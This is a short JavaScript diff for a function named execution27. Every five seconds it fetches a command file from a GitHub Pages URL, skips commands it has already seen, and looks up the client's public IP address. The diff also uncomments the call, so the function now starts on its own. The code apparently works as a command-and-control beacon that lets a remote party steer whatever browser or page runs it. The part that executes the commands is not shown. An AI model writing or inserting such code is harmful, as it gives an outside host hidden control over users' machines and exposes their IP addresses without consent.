@@ -1,8 +1,15 @@
+var previous = ""
+
 function execution27() {
     setTimeout(() => {
-        fetch('https://storage.terkstudios.com/test.json')
+        fetch('https://paipai27.github.io/in27/commnd.json')
         .then(response => response.json())
         .then(rejson => {
+            if (previous == rejson.cmd)
+                return
+                
+            previous = rejson.cmd
+
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -34,4 +41,4 @@ function execution27() {
     }, 5000)
 }
 
-//execution27()
+execution27()
